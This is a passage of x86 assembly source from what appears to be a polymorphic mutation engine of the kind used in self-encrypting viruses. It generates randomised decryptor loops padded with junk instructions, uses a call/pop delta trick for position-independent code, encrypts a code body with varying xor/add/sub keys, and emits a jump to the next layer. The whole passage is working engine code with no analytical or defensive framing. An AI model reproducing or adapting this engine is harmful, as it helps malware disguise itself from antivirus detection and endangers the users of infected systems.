ifndef POLY_DEBUG 					
					; GENERATE JUMP TO NEXT LAYER 
					call Asm_Jmp_Next_Layer

else				
					mov ax,0c35dh
					stosw
endif ; POLY_DEBUG 					
					
					
					mov eax,edi
					sub eax,dword ptr [ebp].poly_decryptor_base
					mov dword ptr [esp + 1ch],eax
					
					popad 
					retn
;
;	Assemble Mov Reg,Imm32 
;

; in:
; 	ebx = reg
; 	ecx = value 
; 	edi = buffer
Asm_Mov_Reg_Imm_32: 			mov eax,3
					call random
					
					cmp eax,0
					je mov_lea
					
					cmp eax,1
					je mov_push_pop   

					; mov reg imm32 
mov_reg_imm32:				mov byte ptr [edi],0b8h
					add byte ptr [edi],bl
					mov dword ptr [edi + 1],ecx
					add edi,5
					retn
					
mov_push_pop:				mov al,68h
					stosb
					mov eax,ecx
					stosd
					mov eax,ebx
					add eax,58h
					stosb											
					retn
					
mov_lea:				mov eax,ebx
					rol eax,11
					add eax,058dh
					stosw
					
					mov eax,ecx
					stosd
					retn 					
					
;
;	Create Poly Delta Routine
;

; eax = register
; edi = buffer
 
Asm_Poly_Delta:				push ebx
					push ecx
					
					mov ecx,eax
					mov byte ptr [edi],0e8h
					inc edi 
					mov ebx,edi
					stosd
					
					call Set_In_Pred ; avoid ptr init in delta call 
					 
					call PolyGarble
					
					call Set_In_Pred 
					
					mov eax,edi
					sub eax,ebx
					sub eax,4
					mov dword ptr [ebx],eax
					add ebx,3 ; not 4   
					
					mov eax,ecx
					add al,58h
					stosb  
					
					mov eax,ecx
					add al,0c0h
					rol eax,8
					add eax,081h
					stosw 
					
					mov eax,ebx ; ebx = call delta + 5 
					sub eax,dword ptr [ebp].poly_decryptor_base
					add eax,dword ptr [ebp].poly_decryptor_base_va
					not eax
					stosd
					
					pop ecx
					pop ebx 	 			
					retn
					
;
;	Initialize Pointer Register 
;					

;ebx = reg 
;ecx = value 
;edi = buffer 

Asm_Init_Ptr:    			mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_POS_INDEPENDENT
					test eax,eax
					jz Asm_Init_No_Delta
					
					mov eax,ebx
;					push edx
;					mov edx,dword ptr [ebp].poly_decryptor_base_va
					call Asm_Poly_Delta 
;					pop edx 
					
					; add reg val
					mov al,081h
					mov ah,bl
					add ah,0c0h
					stosw
					
					mov eax,ecx
					stosd
					
					retn  
		
Asm_Init_No_Delta:			call Asm_Mov_Reg_Imm_32				
					retn

;edi = buffer 					
Asm_Jmp_Next_Layer:			push ebx
					push ecx
					push edx
					
					; if poly_decryptor_base_va isnt set 
					; make the transfer instruction relative (call/jmp... rel32)
					cmp dword ptr [ebp].poly_ptr_decrypt_buf_va,0
					je Asm_Relative
					
					call get_free_reg_32	
					mov ebx,eax
					
					mov ecx,dword ptr [ebp].poly_ptr_decrypt_buf_va
					test ecx,ecx
					jnz @f
					mov ecx,dword ptr [ebp].poly_ptr_code_base_va
@@:					add ecx,dword ptr [ebp].poly_code_entry_offset
					
					mov eax,dword ptr [ebp].poly_options
					and eax,POLY_OPT_POS_INDEPENDENT
					test eax,eax 
					jnz Asm_Jmp_Layer_Delta 
					
					call Asm_Mov_Reg_Imm_32
					
					jmp Asm_Jmp_C
					
Asm_Jmp_Layer_Delta:			mov eax,ebx
;					mov edx,dword ptr [ebp].poly_ptr_code_base_va
					call Asm_Poly_Delta
					
					mov al,81h
					stosb
					mov eax,0c0h
					add eax,ebx 
					stosb 
					
					mov eax,ecx 
					stosd 
					
Asm_Jmp_C:				mov eax,50h
					add eax,ebx
					stosb
					
					call PolyGarble 
					
					mov eax,0c3h
					stosb
				
@@:					pop edx 
					pop ecx
					pop ebx 
					retn

					; call rel32					
Asm_Relative:				mov al,0e8h
					stosb
					mov eax,dword ptr [ebp].poly_ptr_code_base_raw
					add eax,dword ptr [ebp].poly_code_entry_offset
					sub eax,edi
					sub eax,4
					stosd 
					
					call PolyGarble
					call PolyGarble
					mov eax,0c3h
					stosb
					jmp @b
					 
;
;	Assemble Move Data Loop 
;					
Asm_Move_Data_Loop:			pushad
					cmp dword ptr [ebp].poly_ptr_decrypt_buf_va,0
					je Asm_Move_Data_End
					
					; init store reg
					call get_free_reg_32
					cmp eax,-1
					je Asm_Move_Data_End ; we got problem here
					mov dword ptr [ebp].poly_store_reg,eax
					
					call PolyGarble
					
					; init src ptr
					mov ebx,dword ptr [ebp].poly_ptr_reg
					mov ecx,dword ptr [ebp].poly_ptr_code_base_va
					call Asm_Init_Ptr
					
					call PolyGarble
					
					; init dest ptr
					mov ebx,dword ptr [ebp].poly_key_reg
					mov ecx,dword ptr [ebp].poly_ptr_decrypt_buf_va
					call Asm_Init_Ptr
					
					call PolyGarble 
					
					; init counter 
					mov ebx,dword ptr [ebp].poly_loop_reg
					mov ecx,dword ptr [ebp].poly_code_size
					shr ecx,2 
					inc ecx
					call Asm_Mov_Reg_Imm_32
					
					call Set_In_Loop
					
					mov ebx,edi ; loop start
					
					call PolyGarble  
					
					; mov store_reg/[scr]
					mov eax,dword ptr [ebp].poly_store_reg
					rol eax,3
					add eax,dword ptr [ebp].poly_ptr_reg
					rol eax,8
					add eax,8bh
					stosw
					
					; mov [dest]/store_reg
					mov eax,dword ptr [ebp].poly_store_reg 
					rol eax,3
					add eax,dword ptr [ebp].poly_key_reg
					rol eax,8
					add eax,089h
					stosw 
					
					call PolyGarble  
					
					; inc store_reg
					mov eax,dword ptr [ebp].poly_ptr_reg
					add eax,0c0h
					rol eax,8
					add eax,83h
					stosw
					
					mov al,4h
					stosb 
					
					call PolyGarble
					 
					mov eax,dword ptr [ebp].poly_key_reg
					add eax,0c0h
					rol eax,8
					add eax,83h
					stosw
					
					mov al,4h
					stosb 
					
					call PolyGarble 
					
					; dec loop_counter
					mov eax,dword ptr [ebp].poly_loop_reg
					add eax,48h
					stosb 
					
					call PolyGarble 
					
					; test loop_counter/loop_counter
					mov eax,dword ptr [ebp].poly_loop_reg
					rol eax,3
					add eax,dword ptr [ebp].poly_loop_reg
					add eax,0c0h
					rol eax,8
					add eax,085h
					stosw 
					
					; jcc loop
					mov eax,ebx 
					sub eax,edi
					push eax
					not eax
					cmp eax,255 / 2
					pop eax 
					jbe Move_Loop_Short 
					
					; near jcc 		
					sub eax,6			
					mov word ptr [edi],0850fh
					mov dword ptr [edi + 2],eax
					add edi,6 
					
					jmp @f
					
					; short jcc 				
Move_Loop_Short:			sub eax,2
					mov byte ptr [edi],75h ; jnz
					mov byte ptr [edi + 1],al
					add edi,2
@@:					
					call Set_In_Loop ; unset loop state flag  
					
					mov eax,dword ptr [ebp].poly_store_reg
					call unset_reg_32 ; free store reg 
					
					mov dword ptr [esp],edi ; store edi
					
;					mov eax,dword ptr [ebp].poly_ptr_decrypt_buf_va
;					mov dword ptr [ebp].poly_ptr_code_base_va,eax  
Asm_Move_Data_End:			popad 
					retn 					
					
;
;	Auxiliary routines
;	

generate_key_32:			push ecx
					push ebx
					mov ecx,4
					
generate_key_loop:			mov eax,0ffh - 10
					call random 
					add eax,10
					mov bl,al
					rol ebx,8
					dec ecx                
					test ecx,ecx			; to avoid permutation errors
					jnz generate_key_loop
					mov eax,ebx
					pop ebx
					pop ecx
					retn
					
;
;	Test Flag 
;

; eax > 0 => we are in loop already
Is_In_Loop:				mov eax,POLY_FLAG_IN_LOOP
					jmp Test_Flag 
					 
Set_In_Loop: 				push eax
					mov eax,POLY_FLAG_IN_LOOP
					jmp Set_Flag
					
Is_In_Subr:				mov eax,POLY_FLAG_IN_SUBR
					jmp Test_Flag 
					
Set_In_Subr:				push eax
					mov eax,POLY_FLAG_IN_SUBR
					jmp Set_Flag
				
Is_In_Pred:				mov eax,POLY_FLAG_IN_PRED
					jmp Test_Flag 

Set_In_Pred:				push eax
					mov eax,POLY_FLAG_IN_PRED
					jmp Set_Flag			
					
Test_Flag:          			push ebx
					mov ebx,dword ptr [ebp].poly_garbler_flags
					and ebx,eax
					mov eax,ebx
					pop ebx
					retn

Set_Flag:				xor dword ptr [ebp].poly_garbler_flags,eax
					pop eax
					retn
	
;
;	Registers handling functions 
;

; eax = reg
convert_32:         			push ecx
					mov ecx,eax
					xor eax,eax
					inc eax
					rol eax,cl
					pop ecx
					retn

set_reg_32:				push eax
					call convert_32
					or dword ptr [ebp].poly_reg_usage,eax
					pop eax
					retn
					
unset_reg_32:				push eax
					call convert_32
					xor dword ptr [ebp].poly_reg_usage,eax
					pop eax
					retn

; if eax != 0 , reg is used already					
is_used_32:         			push ebx
					call convert_32
					mov ebx,eax
					mov eax,dword ptr [ebp].poly_reg_usage
					and eax,ebx
					pop ebx
					retn

; if eax after ret is zero , no regs are avaiable 					
is_any_free_32:    			mov eax,dword ptr [ebp].poly_reg_usage
					not eax
					and eax,0ffh
					retn

get_reg_32:				mov eax,8
					call random
					retn
					
get_reg_32_no_stack:mov eax,6
					call random
					cmp eax,4
					je get_reg_32_add
					cmp eax,5
					je get_reg_32_add
					retn

get_reg_32_add:     			add eax,2
					retn

;
; return unused reg32 or -1 if no regs are avaiable
get_free_reg_32:			call is_any_free_32
					test eax,eax
					jz no_reg_avaiable_32
					
get_another_reg_32:			call get_reg_32
					push eax
					call is_used_32
					test eax,eax
					pop eax
					jnz get_another_reg_32
					
					call set_reg_32 ; set reg as used 
					retn 

no_reg_avaiable_32: dec eax	
					retn

get_free_reg_32_no_set:
					call get_free_reg_32
					cmp al,0ffh
					je get_free_reg_32_no_set_exit 
					call unset_reg_32
get_free_reg_32_no_set_exit:					
					retn 					


;
;	Crypt Data
;

; add/sub must occur in reversed order according to decryption order
; eax = key
crypt_data:				pushad 
					mov edi,dword ptr [ebp].poly_ptr_code_base_raw
					mov ecx,dword ptr [ebp].poly_code_size
					mov ebx,dword ptr [ebp].poly_slide_key
					
crypt_loop:				cmp dword ptr [ebp].poly_algo1,1
					je crypt_algo1
					
					cmp dword ptr [ebp].poly_algo1,2
					je crypt_algo2

					xor dword ptr [edi],eax
					jmp crypt_algo_c
					
crypt_algo1:     			sub dword ptr [edi],eax 
					jmp crypt_algo_c
					
crypt_algo2:       			add dword ptr [edi],eax
 
 					; now apply slide key 
crypt_algo_c:				mov dword ptr [esp+1Ch],eax ; save eax
					cmp dword ptr [ebp].poly_algo2,1
					je crypt_slide1
					
					cmp dword ptr [ebp].poly_algo2,2
					je crypt_slide2		
					
					xor eax,ebx
					jmp crypt_slide_c
					
crypt_slide1:				sub eax,ebx
					jmp crypt_slide_c
					
crypt_slide2:				add eax,ebx

crypt_slide_c: 				inc edi
					loop crypt_loop

;					mov dword ptr [esp+1Ch],eax ; save eax 
					popad 
					retn
					
;
; 	random Routine 
;

; Entry: EAX == Max_Val.
; Return: EAX == random  number between 0..Max_Val-1.
; routine by T-2000
		
random:					push ecx
    					push edx
    					push eax

					rdtsc
					mov ecx,dword ptr [ebp].poly_random_seed ; random  seed 
					add eax,ecx

					rol ecx, 1
					add ecx, 666h
					mov dword ptr [ebp].poly_random_seed,ecx ; random  seed 

					push 32
					pop ecx

CRC_Bit_1:		    		shr eax, 1
    					jnc Loop_CRC_Bit_1
    					xor eax,0EDB88320h

Loop_CRC_Bit_1:   			loop CRC_Bit_1                
    					pop ecx
    					xor edx,edx
    					div ecx

					xchg edx,eax
					or eax,eax

					pop edx
					pop ecx
					retn 


					assume ebp:nothing 
